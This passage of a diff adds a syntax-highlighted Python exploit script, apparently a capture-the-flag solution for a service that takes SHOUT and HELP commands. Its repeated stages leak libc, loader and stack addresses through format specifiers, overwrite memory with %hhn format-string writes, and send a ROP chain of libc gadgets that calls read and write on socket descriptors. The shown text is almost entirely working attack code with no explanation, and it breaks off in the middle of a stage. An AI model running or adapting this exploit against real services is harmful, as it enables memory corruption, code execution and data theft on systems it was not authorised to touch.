+<span class="n">leak</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x270b3</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">for</span> <span class="n">tmp</span> <span class="ow">in</span> <span class="n">leak</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]:</span>
+    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">):</span>
+        <span class="n">fd</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ld : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ld</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"stack : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"fd: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">fd</span><span class="p">))</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="n">pivot</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'SHOUT '</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="s">'%{}c%{}$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fsb</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">),</span> <span class="mi">53</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+    <span class="n">pay</span> <span class="o">+=</span> <span class="s">'%{}c%{}$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fsb</span><span class="p">((</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="n">i</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">),</span> <span class="mi">54</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x5f</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span> <span class="o">+</span> <span class="s">'B'</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ld</span> <span class="o">+</span> <span class="mh">0x1948</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+
+<span class="n">prbp</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x00000000000256c0</span>
+<span class="n">prdi</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000026b72</span>
+<span class="n">prsi</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000027529</span>
+<span class="n">prdxp</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000162866</span>
+<span class="n">lr</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x000000000005aa48</span>
+<span class="n">read</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x111130</span>
+<span class="n">write</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1111d0</span>
+<span class="n">writable</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1ee000</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x228</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pfd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pfd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mh">0x440</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">lr</span><span class="p">)</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pay</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+
+<span class="c1">#####################################
+############## STAGE 3 ##############
+#####################################
+</span><span class="n">pfd</span> <span class="o">=</span> <span class="n">fd</span> <span class="o">+</span> <span class="mi">1</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'SHOUT %216$p.%217$p.%218$p.%249$s'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'YOU HEAR AN ECHO</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'YOU HEAR AN ECHO</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x270b3</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">for</span> <span class="n">tmp</span> <span class="ow">in</span> <span class="n">leak</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]:</span>
+    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">):</span>
+        <span class="n">fd</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ld : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ld</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"stack : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"fd: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">fd</span><span class="p">))</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="n">pivot</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'SHOUT '</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="s">'%{}c%{}$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fsb</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">),</span> <span class="mi">53</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+    <span class="n">pay</span> <span class="o">+=</span> <span class="s">'%{}c%{}$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fsb</span><span class="p">((</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="n">i</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">),</span> <span class="mi">54</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x5f</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span> <span class="o">+</span> <span class="s">'B'</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ld</span> <span class="o">+</span> <span class="mh">0x1948</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+
+<span class="n">prbp</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x00000000000256c0</span>
+<span class="n">prdi</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000026b72</span>
+<span class="n">prsi</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000027529</span>
+<span class="n">prdxp</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000162866</span>
+<span class="n">lr</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x000000000005aa48</span>
+<span class="n">read</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x111130</span>
+<span class="n">write</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1111d0</span>
+<span class="n">writable</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1ee000</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x228</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pfd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pfd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mh">0x440</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">lr</span><span class="p">)</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pay</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+
+<span class="c1">#####################################
+############## STAGE 4 ##############
+#####################################
+</span><span class="n">pfd</span> <span class="o">=</span> <span class="n">fd</span> <span class="o">+</span> <span class="mi">1</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'SHOUT %216$p.%217$p.%218$p.%249$s'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'YOU HEAR AN ECHO</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'YOU HEAR AN ECHO</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x270b3</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">for</span> <span class="n">tmp</span> <span class="ow">in</span> <span class="n">leak</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]:</span>
+    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">):</span>
+        <span class="n">fd</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ld : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ld</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"stack : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"fd: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">fd</span><span class="p">))</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="n">pivot</span>
+
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'SHOUT '</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="s">'%{}c%{}$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fsb</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">),</span> <span class="mi">53</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+    <span class="n">pay</span> <span class="o">+=</span> <span class="s">'%{}c%{}$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fsb</span><span class="p">((</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="n">i</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">),</span> <span class="mi">54</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x5f</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span> <span class="o">+</span> <span class="s">'B'</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ld</span> <span class="o">+</span> <span class="mh">0x1948</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+
+<span class="n">prbp</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x00000000000256c0</span>
+<span class="n">prdi</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000026b72</span>
+<span class="n">prsi</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000027529</span>
+<span class="n">prdxp</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000162866</span>
+<span class="n">lr</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x000000000005aa48</span>
+<span class="n">read</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x111130</span>
+<span class="n">write</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1111d0</span>
+<span class="n">writable</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1ee000</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x228</span>
+
